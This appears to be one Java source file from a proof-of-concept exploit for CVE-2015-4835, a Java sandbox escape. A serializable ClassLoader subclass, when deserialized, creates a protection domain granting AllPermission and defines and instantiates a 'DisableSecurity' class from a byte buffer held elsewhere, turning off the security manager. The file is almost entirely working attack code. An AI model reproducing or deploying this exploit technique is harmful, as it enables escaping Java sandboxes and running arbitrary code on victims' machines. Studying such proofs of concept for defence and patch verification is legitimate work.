package poc.cve_2015_4835;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSigner;
import java.security.CodeSource;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;

public class PrivClassLoader extends java.lang.ClassLoader implements Serializable {
	
	private static final long serialVersionUID = -5464231211481772030L;
	
	private static Field COMPLETED = null;
	private static Field ERROR = null;
	
	private static Method LOG = null;
	
	private static void init( Class< ? > mainCL ) {
		try {
			COMPLETED = mainCL.getField( "COMPLETED" );
			ERROR = mainCL.getField( "ERROR" );
			
			LOG = mainCL.getMethod( "log", String.class, Object[].class );
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
	}
	
	private static void log( String fmt, Object... args ) {
		try {
			if( PrivClassLoader.LOG != null ) {
				PrivClassLoader.LOG.invoke( null, fmt, args );
			}
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
	}
	
	private static void complete( Throwable err ) {
		try {
			if( PrivClassLoader.ERROR != null ) {
				PrivClassLoader.ERROR.set( null, err );
			}
			else if( err != null ){
				throw err;
			}
			
			if( PrivClassLoader.COMPLETED != null ) {
				PrivClassLoader.COMPLETED.set( null, true );
			}
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
	}
	
	private void writeObject( ObjectOutputStream out ) throws IOException {
		
	}
	
	private void readObject( ObjectInputStream in ) {
		try {
			PrivClassLoader.init( ( Class< ? > ) in.readObject() );
			
			log( "Creating privileged domain." );
			final ProtectionDomain privDomain = PrivClassLoader.createPrivDomain();
			final byte[] buf = ByteBuffers.DISABLE_SECURITY;
			
			log( "Defining DisableSecurity class." );
			Class< ? > cl = this.defineClass( null, buf, 0, buf.length, privDomain );
			log( "Defined DisableSecurity class." );
			
			log( "Creating DisableSecurity instance." );
			cl.newInstance( );
			log( "DisableSecurity instance created." );
			
			complete( null );
		}
		catch( Throwable t ) {
			complete( t );
		}
	}
	
	private static ProtectionDomain createPrivDomain() throws IOException {
		PermissionCollection collection = new Permissions();
		collection.add( new AllPermission() );
		
		CodeSource source = new CodeSource( new URL( "file:////" ), new CodeSigner[ 0 ] );
		
		return new ProtectionDomain( source, collection );
	}
}
